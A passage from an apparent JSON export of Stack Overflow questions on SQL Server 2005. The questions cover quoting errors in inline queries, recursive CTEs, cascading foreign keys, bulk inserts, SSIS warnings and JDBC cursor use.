word.</p>\n"},{"tags":["asp.net","sql","sql-server","sql-server-2005","sql-server-2008"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":479,"score":0,"question_id":6120957,"title":"SQL Query Problem in Inline Query in Asp.net","body":"<p>My sql table structure is this</p>\n\n<pre><code>ID  DataName\n1   Lipsum lorem \n3   lipsum's lorem\n</code></pre>\n\n<p>My inline query in asp.net is that</p>\n\n<pre><code>select * from table where DataName like 'lipsum's lorem'\n</code></pre>\n\n<p>It gives the following errors:</p>\n\n<pre><code>Msg 102, Level 15, State 1, Line 1\nIncorrect syntax near 's'.\nMsg 105, Level 15, State 1, Line 1\nUnclosed quotation mark after the character string ''.\n</code></pre>\n\n<p>I don't want to create a stored procedure to prevent this, I want a solution to this using inline queries.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":3086,"score":4,"question_id":528529,"title":"Self-referencing constraint in MS SQL","body":"<p>Is it true that MS SQL restrict self-referencing constraints with ON DELETE CASCADE option? \nI have a table with parent-child relation, PARENT_ID column is foreign key for ID. Creating it with ON DELETE CASCADE option causes error </p>\n\n<blockquote>\n  <p>\"Introducing FOREIGN KEY constraint\n  may cause cycles or multiple cascade\n  paths. Specify ON DELETE NO ACTION or\n  ON UPDATE NO ACTION, or modify other\n  FOREIGN KEY constraints.\"</p>\n</blockquote>\n\n<p>I can't believe that I have to delete this hierarchy in recursive mode. Is there any issue except triggers?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":189,"score":0,"question_id":8731229,"title":"SQL Server string getting truncated","body":"<p>I have a column (<code>col1</code>) with <code>nvarchar(max)</code>.</p>\n\n<p>I am trying to do </p>\n\n<pre><code>DECLARE @my_string NVARCHAR(max)\nset @my_string = N'test'\n\nUPDATE dbo.tab1 \nSET col1 = @my_string + ISNULL(col1, N'')\n</code></pre>\n\n<p>no  luck , I have no idea why it is happening. @marc_s</p>\n\n<p>The string value in <code>col1</code> getting truncated after 250 characters. This happening in both SQL Server 2005 and 2008.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13266334,"title":"Substring method's in SQL query","body":"<p>This is the query which i am using to reduce the length of the character.</p>\n\n<p>these are some example char(\"For more information about the valid SQL Server 2005 data types that can be ... Is an integer that specifies where the substring starts. start can be of type bigint.\")</p>\n\n<p>if i give substring to fix the length up to 15 . the rest of the char should show like this way(...)</p>\n\n<p>my sql query is this.....</p>\n\n<pre><code>select substring('For more information about the valid SQL Server 2005 data types that can be ... Is an integer that specifies where the substring starts. start can be of type bigint.',0,15) from Admin\n</code></pre>\n\n<p>for example: it should show like this</p>\n\n<pre><code>For more information about the valid SQL Server 2005 data.\n</code></pre>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13263499,"title":"How to create Temporary table with Dynamic query in SQL Server 2005","body":"<p>I want to create Temporary table dynamically in SQL Server 2005 like below.</p>\n\n<pre><code>Create Table ##EmpMonthlyTimeReport\n(\n    EmpID UNIQUEIDENTIFIER,\n    EmpName VARCHAR(100),\n    TaskId UNIQUEIDENTIFIER,\n    [07 Nov] NVARCHAR(10),\n    [08 Nov] NVARCHAR(10),\n    [09 Nov] NVARCHAR(10)\n)\n</code></pre>\n\n<p>In the above <strong>##EmpMonthlyTimeReport</strong> table, columns [07 Nov], [08 Nov], [09 Nov] are <strong>NOT</strong> static. They are creating dynamically through another function.</p>\n\n<p>Hence, I am dynamically constructing the above table in one variable called <strong>@EmpMonthlyTimeReport</strong> and I'm executing the constructed sql string like below:</p>\n\n<pre><code>EXEC(@EmpMonthlyTimeReport)\n</code></pre>\n\n<p>I am getting the following error:</p>\n\n<pre><code>Msg 50000, Level 16, State 1, Procedure SVS_WorkOnWeekends, Line 157\nThe name 'INSERT INTO ##EmpMonthlyTimeReport(EmpID, EmpName, TaskId)\nSELECT EmpId, EmpName, TaskId FROM TableData \nSELECT * FROM ##EmpMonthlyTimeReport\nDROP TABLE ##EmpMonthlyTimeReport' is not a valid identifier.\n</code></pre>\n"},{"tags":["sql-server-2005","jdbc","cursor"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3808,"score":1,"question_id":535032,"title":"How do you make sql server jdbc calls to stored procedure use a server side cursor?","body":"<p>I am using JDBC to call a stored procedure in MSSql 2005.  I would like to have the result set make use of server side cursors to limit the amount of memory used by the client.  I am able to do this easily using a simple query and setting the SelectMethod=cursor on the connection.  When I put that query in a stored procedure, it appears that the entire result set is being returned as if the connection were created with SelectMethod=direct.  </p>\n\n<p>Is there a way to make the stored procedure call behave like a simple query.</p>\n\n<p>I have tested with MS SQL JDBC driver 1.1 and 1.2.  In the sample below, the difference between the two values of totalMemory is dependent on the size of the results without fetching any of the rows.</p>\n\n<pre><code>long totalMemoryUsed = java.lang.Runtime.getRuntime().totalMemory();\nString sql = \"{call ap_Select(?, ?, ?, ?)}\";\n\nCallableStatement cstmt = conn.prepareCall(sql,ResultSet.TYPE_FORWARD_ONLY,  \n                           ResultSet.CONCUR_READ_ONLY); \t\ncstmt.setString(1,readAlldbnames );\ncstmt.setString(2,readPublicDbnames);\ncstmt.setString(3, whereClause);\ncstmt.setString(4, \" order by key5 \");\n\nResultSet a_resultSet = cstmt.executeQuery();\nlong totalMemoryUsedAfterQuery = java.lang.Runtime.getRuntime().totalMemory();\n</code></pre>\n"},{"tags":["sql-server-2005","replication","articles"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":829,"score":0,"question_id":2008897,"title":"SQL Server: How to Determine all tables associated with replication, and which articles","body":"<p>How would I iterate through the tables of a database, and determine which publication and article those tables are associated with?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13252165,"title":"concatenate with 3 or 4 joins","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13177874/combine-multiple-rows-int-one-row-with-many-to-many\">combine multiple rows int one row with many to many</a>  </p>\n</blockquote>\n\n\n\n<p>Using SQL Server I have the following tables/ data</p>\n\n<pre><code>CUS_VISIT\n\nCus_ID    Cus_Vis_ID\n1           01\n1           02\n2           01\n</code></pre>\n\n<p>and</p>\n\n<pre><code>CUS_EVENT\n\nCus_Event_ID    Cus_ID    Cus_Vis_ID\n001               1            01\n002               1            01\n</code></pre>\n\n<p>and</p>\n\n<pre><code>CUS_XREF\n\nCus_ID    Cus_Event_ID    Cus_Prt_ID    Cus_Seq_No\n1            001               1           1\n1            001               2           1\n</code></pre>\n\n<p>and</p>\n\n<pre><code>CUS_PRT\n\nCus_ID    Cus_Prt_ID    Prt_Cd\n1            1            1A\n1            2            2A\n</code></pre>\n\n<p>I am trying to get the following</p>\n\n<p>SQL RESULTS</p>\n\n<pre><code>Cus_ID     Prt_Cd     Cus_Vis_ID\n1           1A,2A        1\n</code></pre>\n\n<p>what I end up with is</p>\n\n<p>SQL RESULTS</p>\n\n<pre><code>Cus_ID     Prt_Cd     Cus_Vis_ID\n1           1A           1\n1           2A           1\n</code></pre>\n\n<p>The tables are linked by ...</p>\n\n<pre><code>CUS_VISIT.Cus_ID    = CUS_EVENT.Cus_ID \nCUS_VISIT.Cus_Vis_ID  = CUS_EVENT.Cus_Vis_ID\nCUS_VISIT.Cus_ID = CUS_XREF.Cus_ID\nCUS_EVENT.Cus_Event_ID = CUS_XREF.Cus_Event_ID    \nCUS_XREF.Cus_Prt_ID = CUS_PRT.Cus_Prt_ID \nCUS_XREF.Cus_ID = CUS_PRT.Cus_ID \n</code></pre>\n\n<p>I can almost get what I am after if I drop the CUS_XREF.Cus_Prt_ID = CUS_PRT.Cus_Prt_ID join but then I get all of the part codes (Prt_Cd) for the customer not just the ones for that visit. </p>\n\n<p>here is what i have</p>\n\n<pre><code>select distinct CUS_EVENT.cus_id, CUS_EVENT.cus_visit_id,\n    (Select CUS_PRT.prt_cd + ',' AS [text()]\n    From CUS_PRT, CUS_XREF\n    where \n    CUS_EVENT.cus_id=XREF.cus_id\n    and CUS_EVENT.cus_event_id = XREF.cus_event_id \n    and CUS_XREF.cus_id=CUS_PRT.cus_id \n    and CUS_XREF.cus_prt_id = CUS_PRT.cus_prt_id \n    and CUS_XREF.prt_seq_no ='1'\n    order by CUS_PRT.prt_cd\n    for XML PATH('')) [Codes]\nfrom CUS_EVENT\n</code></pre>\n\n<p>i made a similar post recently but didn't get any specific help. i think i need another sub-query some where. thanks for looking at this.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":7,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":5392,"score":9,"question_id":2384786,"title":"Delete SQL Server 2005 records without logging","body":"<p>How to delete records from SQL Server 2005 tables without logging them into transaction logs. </p>\n\n<p>I do not wish to log because once deleted, those records will never be needed again. </p>\n\n<p>Currently the various deletes take too much of time. Are there any other options to improve performance of delete statements? I can not use truncate since there is a where clause needed.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13258297,"title":"A script to test existence of primary keys","body":"<p>Trying to figure out a SQL script to test the existence of primary keys in cerain tables.  If the table has no primary key, then the script should output the table name.</p>\n\n<pre><code>Tables to test:\nTableA\nTableB\nTableC\n</code></pre>\n\n<p>After running the script (and lets say TableA and TableC have PKs, but not TableB), then the output would be below:</p>\n\n<pre><code>NoKeys\nTableB\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13254583,"title":"Removing LOB column from table. Lob used page count not equals to 0","body":"<p>I altered a table that was used to contains a Lob column (VarBinary(MAX)).</p>\n\n<p>When I run </p>\n\n<pre><code>select * from sys.dm_db_partition_stats\nwhere [object_id] = object_id('MyTable')\n</code></pre>\n\n<p>the lob_used_page_count is 1014969. I thought it would be 0. Am I wrong or is there something I need to do?</p>\n"},{"tags":["sql","sql-server","query","sql-server-2005"],"answer_count":9,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":76,"score":-1,"question_id":13253445,"title":"Select Part of Column","body":"<p>I was wondering if anyone could help with a query to select part of a column.</p>\n\n<p>The column 'criteriadata' contains data that would look like this:</p>\n\n<blockquote>\n  <p><strong>CriteriaData</strong></p>\n  \n  <p>14 27 15 C</p>\n  \n  <p>14 30 15 DD</p>\n  \n  <p>14 38 15 Pass</p>\n  \n  <p>14 33 15 Pass</p>\n</blockquote>\n\n<p>How can I select just the data that appears after the number 15.</p>\n\n<p>Many thanks.</p>\n"},{"tags":["java","sql-server-2005","java-ee","weblogic","weblogic-10.x"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":694,"score":0,"question_id":9409496,"title":"weblogic stuck issue","body":"<p>We have encountered an issue as below\nwe don't know if the problem are:\n1.socket reading from database is too long that reach the StuckThreadMaxTime 600s\n2.database query is running too long\n2.locking on database or other objects</p>\n\n<p>any suggestions will be greatly appreciated!</p>\n\n<blockquote>\n  <p>Thread-36 \"[STUCK] ExecuteThread: '3' for queue:\n  'weblogic.kernel.Default (self-tuning)'\"  {\n      jrockit.net.SocketNativeIO.readBytesPinned(SocketNativeIO.java:???)\n      jrockit.net.SocketNativeIO.socketRead(SocketNativeIO.java:31)\n      java.net.SocketInputStream.socketRead0(SocketInputStream.java:???)\n      java.net.SocketInputStream.read(SocketInputStream.java:107)\n      com.microsoft.sqlserver.jdbc.DBComms.receive(Unknown Source)\n      com.microsoft.sqlserver.jdbc.SQLServerStatement.doExecuteStatement(Unknown\n  Source)\n      com.microsoft.sqlserver.jdbc.SQLServerStatement$StatementExecutionRequest.executeStatement(Unknown\n  Source)\n      com.microsoft.sqlserver.jdbc.CancelableRequest.execute(Unknown Source)\n      com.microsoft.sqlserver.jdbc.SQLServerConnection.executeRequest(Unknown\n  Source)</p>\n  \n  <p>^-- Holding lock: com.microsoft.sqlserver.jdbc.TDSWriter@41dbbdd[thin lock]\n      com.microsoft.sqlserver.jdbc.SQLServerStatement.executeQuery(Unknown\n  Source)\n      com.microsoft.sqlserver.jdbc.SQLServerStatement.getMaxFieldSize(Unknown\n  Source)\n      weblogic.jdbc.common.internal.ConnectionEnv.cleanUpStatementForReUse(ConnectionEnv.java:1356)\n      weblogic.jdbc.common.internal.ConnectionEnv.returnCachedStatement(ConnectionEnv.java:1118)\n      ^-- Holding lock: weblogic.jdbc.common.internal.ConnectionEnv$1@41f2d97[thin lock]\n      weblogic.jdbc.wrapper.Statement.internalClose(Statement.java:342)\n      weblogic.jdbc.wrapper.Statement.doClose(Statement.java:399)\n      weblogic.jdbc.wrapper.Statement.close(Statement.java:391)\n      com.riskintegrator.infrastructure.database.DBConnector.getConnection(DBConnector.java:66)\n      ^-- Holding lock: com.riskintegrator.infrastructure.database.DBConnector@1fda7d8[thin\n  lock]\n      com.riskintegrator.infrastructure.database.DBConnector.(DBConnector.java:56)\n      com.riskintegrator.slsb.BaseSessionBean.populateFormWithPreparedStatement(BaseSessionBean.java:76)\n      com.riskintegrator.slsb.BaseSession_6uq9n4_EOImpl.populateFormWithPreparedStatement(BaseSession_6uq9n4_EOImpl.java:763)\n      com.riskintegrator.slsb.BaseSessionDelegate.populateFormWithPreparedStatement(BaseSessionDelegate.java:118)\n      com.riskintegrator.slsb.setup.SeverityBandBD.selectByValue(SeverityBandBD.java:181)\n      com.riskintegrator.slsb.ca.ComputeAssessmentScoreBean.ComputeRiskScore(ComputeAssessmentScoreBean.java:332)\n      com.riskintegrator.slsb.ca.ComputeAssessmentScoreBean.ComputeAssessmentScore(ComputeAssessmentScoreBean.java:119)\n      com.riskintegrator.slsb.ca.ComputeAssessmentScoreBean_s478gq_EOImpl.ComputeAssessmentScore(ComputeAssessmentScoreBean_s478gq_EOImpl.java:37)\n      com.riskintegrator.slsb.ca.ComputeAssessmentScoreBD.ComputeAssessmentScore(ComputeAssessmentScoreBD.java:32)\n      com.riskintegrator.slsb.ca.AssessmentScoreBean.ProcessAssessment(AssessmentScoreBean.java:44)\n      com.riskintegrator.slsb.ca.AssessmentScoreSession_nlmr0a_EOImpl.ProcessAssessment(AssessmentScoreSession_nlmr0a_EOImpl.java:37)\n      com.riskintegrator.slsb.ca.AssessmentScoreBD.ProcessAssessment(AssessmentScoreBD.java:36)\n      com.riskintegrator.slsb.ScheduledBatchBean.executeJob(ScheduledBatchBean.java:568)\n      com.riskintegrator.slsb.ScheduledBatchBean.executeDailyRunOnce(ScheduledBatchBean.java:792)\n      com.riskintegrator.slsb.ScheduledBatchBean.ejbTimeout(ScheduledBatchBean.java:957)\n      weblogic.ejb.container.timer.TimerImpl.timerExpired(TimerImpl.java:219)</p>\n  \n  <p>^-- Holding lock: weblogic.ejb.container.timer.TimerImpl@12c8e34[thin lock]\n      weblogic.timers.internal.TimerImpl.run(TimerImpl.java:253)\n      weblogic.work.SelfTuningWorkManagerImpl$WorkAdapterImpl.run(SelfTuningWorkManagerImpl.java:516)\n      weblogic.work.ExecuteThread.execute(ExecuteThread.java:198)\n      weblogic.work.ExecuteThread.run(ExecuteThread.java:165)</p>\n</blockquote>\n"},{"tags":["c#","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":426,"score":0,"question_id":1635003,"title":"How to Ignore SQL Error? - C#","body":"<p>I am making an insert on a unique column and the system is returning an error saying I can't insert duplicate rows. How can I ignore this error in C#?</p>\n\n<p><strong>Edit</strong>\nWithout using try/catch</p>\n\n<p>See <a href=\"http://stackoverflow.com/questions/1634833/insert-a-row-only-if-a-row-does-not-exist\">this question</a> for why I want to ignore the error.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13248659,"title":"Round the third decimal place up into the second decimal place (e.g. $0.033 becomes $0.04)","body":"<p>When we increased the price with 10%, some products (the ones that have 3 decimal points), got an unwanted price change. For example, an item that had a price of <code>0.03</code> changed to <code>0.033</code>. </p>\n\n<p>Our client doesn't want a three decimal point in the pricing. </p>\n\n<p>We want to round the third decimal place up into the second decimal place (e.g. <code>$0.033</code> becomes <code>$0.04</code>).</p>\n\n<p>If my value is <code>0.033</code>, I want result to be <code>0.04</code>.</p>\n\n<p>Please help me</p>\n\n<p>Regards</p>\n\n<p>Amit Vyas</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","truncate","foreign-keys"],"answer_count":13,"favorite_count":14,"up_vote_count":60,"down_vote_count":0,"view_count":77724,"score":60,"question_id":253849,"title":"Cannot truncate table because it is being referenced by a FOREIGN KEY constraint?","body":"<p>Using MSSQL2005, Can I truncate a table with a foreign key constraint if I first truncate the child table(the table with the primary key of the FK relationship)?</p>\n\n<p>I know I can use a DELETE without a where clause and then RESEED the identity OR</p>\n\n<p>Remove the FK, truncate and recreate but I thought as long as you truncate the child table you'll be OK however I'm getting a </p>\n\n<p>\"Cannot truncate table 'TableName' because it is being referenced by a FOREIGN KEY constraint.\"</p>\n\n<p>error.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":88,"score":3,"question_id":13157508,"title":"Why does a NULL aggregate warning in an SQL query causes the SSIS package to fail?","body":"<p>An SSIS Package was failing with an error message as below: </p>\n\n<blockquote>\n  <p>Code: 0xC0202009\n     Source: DFT Populate ImageSummary OLE_SRC ProductImage [1]\n     Description: SSIS Error Code DTS_E_OLEDBERROR.  An OLE DB error has occurred. Error code: 0x80004005.\n  An OLE DB record is available.  Source: \"Microsoft SQL Native Client\"  Hresult: 0x00040EDA  Description: \"Warning: Null value is eliminated by an aggregate or other SET operation.\".</p>\n</blockquote>\n\n<p>On investigation, we have found that the message <code>Warning: Null value is eliminated by an aggregate or other SET operation.</code> is being returned by a SQL server (2005) query which the SSIS package runs as the source in DFT to insert into a destination table.</p>\n\n<pre><code>Select ProductID ,ImageTypeID ,DistinctImageCount ,ImageSize \nfrom \n    (select a.ProductID ,a.ImageTypeID ,a.DistinctImageCount ,a.ImageSize ,RANK() OVER (PARTITION BY a.ProductID, a.ImageTypeID ORDER BY a.ImageSize) As Ranker \n    from \n        (SELECT TOP 100 Percent spi.ProductID ,sit.ImageTypeID ,CAST(COUNT(DISTINCT spi2.ImageTypeID) as bit) DistinctImageCount ,CAST(spi2.Size as varchar(50)) as ImageSize \n        FROM Stage.ProductImage spi CROSS JOIN Reference.ImageType sit LEFT JOIN Stage.ProductImage spi2 ON spi.ProductID = spi2.ProductID AND sit.ImageTypeID = spi2.ImageTypeID \n        GROUP BY spi.ProductID, sit.ImageTypeID,spi2.Size \n        ORDER BY spi.ProductID, sit.ImageTypeID,spi2.Size\n        )a\n    )b \nwhere ranker = 1 \nOrder by ProductID,ImageTypeID\n</code></pre>\n\n<p>We have resolved the issue by eliminating the warning message from SQL server by modifying the query: </p>\n\n<h3>From</h3>\n\n<p><code>CAST(COUNT(DISTINCT spi2.ImageTypeID)as bit) DistinctImageCount</code></p>\n\n<h3>To</h3>\n\n<p><code>CAST(SUM(DISTINCT ISNULL(spi2.ImageTypeID,0)) as bit) DistinctImageCount</code>. </p>\n\n<p>However we have few questions as below which we couldn't find an explanation and hoping to get an answer on this forum:</p>\n\n<ol>\n<li><p>Why does a warning from SQL bubbles up to the SSIS package and causes the\nSSIS package to fail?</p></li>\n<li><p>If we run the same package in all other dev and UAT environments\nwith the same data set, it works fine. We can see the warning\nshowing up in the SQL Server Management Studio, however does not\ncause the SSIS to fail. However the SSIS package in our Production\nenvironment fails. We are failing to understand the logic? Is there\nany threshold of warnings?</p></li>\n</ol>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13246561,"title":"select data vice versa","body":"<p>I have two table in my database.</p>\n\n<pre><code>1) User Table\n\nid  username    password    logo    email\n1   admin        admin      NULL    1   \n2   support     support     NULL    NULL    \n3   test        test        NULL    NULL    \n\n\n2) Link Account Table\n\nID  AccountID   LinkAccountID\n1       1           2\n</code></pre>\n\n<p>Now if i select username with accountid 1 then it will return me Admin and Support\n    same way if i select username with accountid 2 then also it will return admin and support\n    and if i select username with accountid 3 then it will return only test</p>\n\n<p>something like vice versa if in link account table account id is 1 or linkaccountid is 1 that will return both id</p>\n\n<p>Thanks in advance</p>\n\n<p>Regards</p>\n\n<p>Amit Vyas</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13246266,"title":"I want to give a parameter for a function from a value from with","body":"<pre class=\"lang-sql prettyprint-override\"><code>WITH\nEmpDetails(EmpCode)\nAS\n(\n SELECT EmpCode \n FROM Employee.tblEmp_Demographics \n WHERE RecordStatus='present' \n)  \n\n    select *,ROW_NUMBER() OVER (PARTITION BY EmpCode ORDER BY DateTaken DESC) AS RowNum,    \n    (select GradeName From Master.GradeMaster where GradeCode=Grade And Deleted=0) As Grade,    \n    SUM(Amount) OVER(PARTITION BY Grade) AS EmpAmount,\n    SUM(DependentAmount) OVER(PARTITION BY Grade) As DepAmount,\n    0 As CheckNo \n    from [dbo].[SELECT_AIRTICKET_DETAILS_BY_DATE](EmpDetails.EmpCode,getdate(),1) WHERE YEAR(DateTaken)=year(getdate())\n</code></pre>\n\n<p>But i get an error</p>\n\n<blockquote>\n  <p>Msg 4104, Level 16, State 1, Line 11 The multi-part identifier \"EmpDetails.EmpCode\" could not be bound.</p>\n</blockquote>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005","c#-4.0","asp.net-webforms"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13245321,"title":"DataTableMapping using adapter.FillSchema method applied on a Stored Procedure","body":"<p>this is a method i was reading about  @MSDN , \nmy question is if for an example i would like to use it on a stored procedure \nwith the fact that the query of that stored procedure is already specifying columns to select from the table like following :</p>\n\n<pre><code>SELECT Columnsome, columnother, , , , ...FROM thisSQLdbTable\n</code></pre>\n\n<p>though i would like to implement the approach of that specific method , it seems very advanced from a little research i have made on \n <strong>\"the best way\"</strong> available to extract data from SQL Server into Asp.net DataTable.</p>\n\n<pre><code>public static DataTable GetCustomerData(string dataSetName,\nstring connectionString)\n{\nDataTable table = new DataTable(dataSetName);\n\nusing (SqlConnection connection = new SqlConnection(connectionString))\n{\n    SqlDataAdapter adapter = new SqlDataAdapter(\n        \"SELECT CustomerID, CompanyName, ContactName FROM dbo.Customers\", connection);\n\n    DataTableMapping mapping = adapter.TableMappings.Add(\"Table\", \"Customers\");\n    mapping.ColumnMappings.Add(\"CompanyName\", \"Name\");\n    mapping.ColumnMappings.Add(\"ContactName\", \"Contact\");\n\n    connection.Open();\n\n    adapter.FillSchema(table, SchemaType.Mapped);\n    adapter.Fill(table);\n    return table;\n}\n</code></pre>\n\n<p>}</p>\n\n<p>or is it not the method to use if i am querying via <code>SP</code> that specifies the selected column</p>\n\n<p>i could actually drop that stored procedure if it is not requiered to select /specify columns </p>\n\n<p>the stored procedure is doing a specific calculation and updates the table with results of calculation then i am switching it's \"MODE\" to select results from the table that was updated.</p>\n\n<p>what i did is recyceling (; giving it a parameter (bit type) \nstored procedure then asks for the value of supplied <code>bool</code> / <code>bit</code> Parameter, \nif its is status true it updates (doing its original task it was made for)</p>\n\n<p>if its false its doing a select oporation so i am using it as i would with 2 separated commands </p>\n\n<p><strong>but now</strong> that i have search for a better way to extract data from db into a Data table </p>\n\n<p>i give up on the two way SP and i will make a selection via the exaple above if they're not intended to be used thogether as with my current SP that does preselection when servs the <code>GetCustomersData()</code> above.</p>\n\n<p>So the question is do i need to let the function to make the selection or can i serve it with my sp ready made selection to implemet it with GetCustomersData() in the way that it will only do rest of task and only mapp the columns that was preselected </p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":18,"score":-2,"question_id":13245947,"title":"I am trying to optimize my code inorder to reduce the processing time","body":"<pre><code>SELECT\n  Account.AccountID,\n  subAccount.AccountID        AS SubAccountID,\n  Balance.currentAvailable    AS SubAccountBalance\nFROM\n  Account\nCROSS APPLY\n  dbo.getSubAccounts('User', Account.AccountID) AS SubAccount\nCROSS APPLY\n  dbo.getCurrentBalance(SubAccount.AccountID)   AS Balance\nWHERE\n  Account.AccountID = 1234\n</code></pre>\n\n<p>in this example how can i avoid cross appy inorder to reduce the execution time</p>\n"},{"tags":["sql-server-2005","recursion","timeout","common-table-expression"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":13244096,"title":"Getting access to additional node information using CTE Recursion SQL Server 2005","body":"<p>Background table data:</p>\n\n<pre><code>memberid sponsorid mailfirstname maillastname\n1000     NULL      Foo           Chu\n1001     1000      Foo1          Chu1\n1002     1001      Foo2          Chu2\n1003     1002      Foo3          Chu3\n1004     1003      Foo4          Chu4\n</code></pre>\n\n<p>The script below prints out the member I'm currently on.  But I also want to print the sponsor information for that member at the same time.  So, currently I get:</p>\n\n<pre><code>Level memberid sponsorid mailfirstname maillastname\n0     1000     NULL      Foo           Chu\n...\n2     1004     1003      Foo4          Chu4\n</code></pre>\n\n<p>but for the 1004 member, I also want their sponsor:</p>\n\n<pre><code>Level memberid sponsorid mailfirstname maillastname sponsorfname sponsorlname\n2     1004     1003      Foo4          Chu4         Foo3         Chu3\n</code></pre>\n\n<p>Query:</p>\n\n<pre><code>WITH Heirarchy\nAS\n(\n   SELECT \n      CONVERT( INT , 0 ) [Level],\n      T1.memberid,\n      T1.sponsorid,\n      T1.mailfirstname,\n      T1.maillastname\n   FROM\n      members T1\n   WHERE\n      T1.memberid = 20000283\n\n   UNION ALL\n\n   SELECT \n      CONVERT( INT , ( TH.[Level] + 1 ) ) [Level],\n      T1.memberid,\n      T1.sponsorid,\n      T1.mailfirstname,\n      T1.maillastname\n   FROM\n      members T1\n   INNER JOIN \n      Heirarchy TH ON TH.memberid = T1.sponsorid\n)\nSELECT * \nFROM Heirarchy \nORDER BY level, maillastname\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","common-table-expression","parents"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":4010,"score":4,"question_id":665617,"title":"How to create an SQL Server 2005 CTE to return parent-child records, for children with multiple parents","body":"<p>I'm experimenting with CTE's in SQL Server but have reached a dead end with getting the following scenario to work. I have a hierarchy table similar to this:</p>\n\n<pre><code>Node(ID:439)\n  Node(ID:123)\n    Node(ID:900)        \n  Node(ID:56)\n    Node(ID:900)\n</code></pre>\n\n<p>Expected results:</p>\n\n<pre><code>NodeID ParentNodeID\n439    0\n123    439\n900    123\n56     439\n900    56\n</code></pre>\n\n<p>So basically we have a parent-child hierarchy table, with one subtle difference. Each child could potentially have more then one parent. I have researched many blog articles, and StackOverflow posts, about creating CTE's that return parent-child records, but they don't return all of the parents for the children, just the first one that it finds.</p>\n\n<p>Here's an example CTE that I tried:</p>\n\n<pre><code>WITH Heirarchy(NodeID, ParentNodeID)\nAS\n(\n    SELECT \n        T1.NodeID,\n          T1.ParentNodeID\n    FROM\n        ParentChildTable T1\n    WHERE\n        T1.NodeID = 439\n\n    UNION ALL\n    SELECT \n        T1.NodeID,\n        T1.ParentNodeID\n    FROM\n        Heirarchy T1\n        INNER JOIN Heirarchy TH ON TH.NodeID = T1.ParentNodeID\n)\n</code></pre>\n\n<p>(Note: The names of the tables and columns in the above CTE have been changed from the orginal for privacy purposes.)</p>\n\n<p>The above CTE works fine, it finds all the parent-child records starting from ID:439, but it only finds one parent for item ID:900, even though it has two parents.</p>\n\n<p>Could someone let me know if this is possible using CTE's, or is there another SQL way to do this?</p>\n\n<p>Cheers.\nJas.</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008","bulkinsert"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":543,"score":3,"question_id":7937581,"title":"Issue with bulk insert","body":"<p>I am trying to insert the data from this link to my SQL server \n<a href=\"https://www.ian.com/affiliatecenter/include/V2/CityCoordinatesList.zip\" rel=\"nofollow\">https://www.ian.com/affiliatecenter/include/V2/CityCoordinatesList.zip</a></p>\n\n<p>I created the table </p>\n\n<pre><code>CREATE TABLE [dbo].[tblCityCoordinatesList](\n[RegionID] [int] NOT NULL,\n[RegionName] [nvarchar](255) NULL,\n[Coordinates] [nvarchar](4000) NULL\n</code></pre>\n\n<p>) ON [PRIMARY]</p>\n\n<p>And I am running the following script to do the bulk insert</p>\n\n<pre><code>BULK INSERT tblCityCoordinatesList\nFROM 'C:\\data\\CityCoordinatesList.txt' \nWITH \n( \n    FIRSTROW = 2, \n    MAXERRORS = 0, \n    FIELDTERMINATOR = '|', \n    ROWTERMINATOR = '\\n'\n)\n</code></pre>\n\n<p>But the bulk insert fails with following error</p>\n\n<pre><code>Cannot obtain the required interface (\"IID_IColumnsInfo\") from OLE DB provider \"BULK\" for linked server \"(null)\".\n</code></pre>\n\n<p>When I google, I found several articles which says the issue may be with RowTerminator, but I tried everything like /n/r, /n etc, but nothing is working. </p>\n\n<p>Could anyone please help me to insert this data into my 